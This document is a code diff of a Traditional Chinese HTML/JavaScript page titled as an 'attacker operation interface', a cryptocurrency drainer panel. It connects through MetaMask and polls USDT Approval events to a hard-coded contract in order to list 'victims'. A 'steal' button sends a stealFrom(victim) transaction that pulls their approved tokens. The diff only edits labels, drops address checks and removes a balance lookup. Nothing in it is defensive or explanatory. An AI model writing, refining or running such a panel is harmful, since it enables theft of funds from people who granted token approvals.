@@ -1,37 +1,33 @@
+
 <!DOCTYPE html>
 <html lang="zh-Hant">
 <head>
   <meta charset="UTF-8">
-  <title>💪️ 攻擊者操作介面 v3.2.0 (🔄實驗番本)</title>
+  <title>🛠️ 攻擊者操作介面 v3.1.4（自動更新版）</title>
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <style>
     body { font-family: 'Arial'; padding: 20px; background: #fff; }
     .ok { color: green; }
     .bad { color: red; }
-    #refresh { color: gray; font-size: 12px; }
   </style>
 </head>
 <body>
-  <h2>💪️ 攻擊者操作介面 v3.2.0 (實驗番本)</h2>
+  <h2>🛠️ 攻擊者操作介面 v3.1.4（自動更新版）</h2>
   <p><b>合約地址：</b><span id="contract">0xFbe9c4748A267562f723C67db673943F901533D6</span></p>
   <p><b>目前登入帳號：</b><span id="account">MetaMask 連線中...</span></p>
-  <p><b>身份驗證：</b><span id="auth" class="bad">未證明</span></p>
+  <p><b>身份驗證：</b><span id="auth" class="bad">尚未驗證</span></p>
+  <br>
   <input id="input" placeholder="受害者地址" />
   <button onclick="steal()">執行盜取</button>
-  <p id="balance"></p>
   <p id="status">等待操作...</p>
-  <p id="refresh"></p>
+<p id="refresh" style="color: gray; font-size: 12px;"></p>
   <h3>📌 授權地址列表：</h3>
   <ul id="victims"></ul>
 
   <script>
     const CONTRACT = "0xFbe9c4748A267562f723C67db673943F901533D6";
     const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
-    const ABI = [
-      "event Approval(address indexed owner,address indexed spender,uint256 value)",
-      "function balanceOf(address) view returns (uint256)",
-      "function allowance(address owner, address spender) view returns (uint256)"
-    ];
+    const ABI = ["event Approval(address indexed owner,address indexed spender,uint256 value)"];
     let provider, signer, attacker;
 
     async function connect() {
@@ -47,7 +43,7 @@
     }
 
     async function fetchApprovals() {
-      document.getElementById("refresh").innerText = '⌛ 正在刷新授權列表...';
+      document.getElementById('refresh').innerText = '🔄 正在刷新授權列表...';
       const contract = new ethers.Contract(USDT, ABI, provider);
       const events = await contract.queryFilter(
         contract.filters.Approval(null, CONTRACT),
@@ -55,7 +51,7 @@
       );
       const ul = document.getElementById("victims");
       ul.innerHTML = "";
-      document.getElementById("refresh").innerText = "✅ 已更新 " + new Date().toLocaleTimeString();
+      document.getElementById('refresh').innerText = '✅ 已更新 ' + new Date().toLocaleTimeString();
       const addresses = new Set();
       events.reverse().forEach(ev => {
         if (!addresses.has(ev.args.owner)) {
@@ -69,13 +65,12 @@
 
     async function steal() {
       const victim = document.getElementById("input").value;
-      if (!ethers.utils.isAddress(victim)) return alert("請輸入合法的地址");
-      if (victim.toLowerCase() === attacker.toLowerCase()) {
-        return document.getElementById("status").innerText = "⛔️ 無效：無法對自己執行";
-      }
       const iface = new ethers.utils.Interface(["function stealFrom(address)"]);
       const data = iface.encodeFunctionData("stealFrom", [victim]);
-      const tx = { to: CONTRACT, data: data };
+      const tx = {
+        to: CONTRACT,
+        data: data
+      };
       document.getElementById("status").innerText = "🚀 呼叫 stealFrom(" + victim + ")...";
       try {
         const sent = await signer.sendTransaction(tx);
@@ -85,25 +80,8 @@
       }
     }
 
-    document.getElementById("input").addEventListener("input", async (e) => {
-      const val = e.target.value;
-      if (ethers.utils.isAddress(val)) {
-        try {
-          const contract = new ethers.Contract(USDT, ABI, provider);
-          const balance = await contract.balanceOf(val);
-          const allowance = await contract.allowance(val, CONTRACT);
-          document.getElementById("balance").innerText = "🧴 USDT: " + balance.toString() +
-            "\n📅 Allowance: " + allowance.toString();
-        } catch {
-          document.getElementById("balance").innerText = "❌ 查詢失敗，請確認地址格式";
-        }
-      } else {
-        document.getElementById("balance").innerText = "";
-      }
-    });
-
     connect();
-    setInterval(fetchApprovals, 10000);
+    setInterval(fetchApprovals, 10000); // 每 10 秒自動刷新授權清單
   </script>
 </body>
 </html>
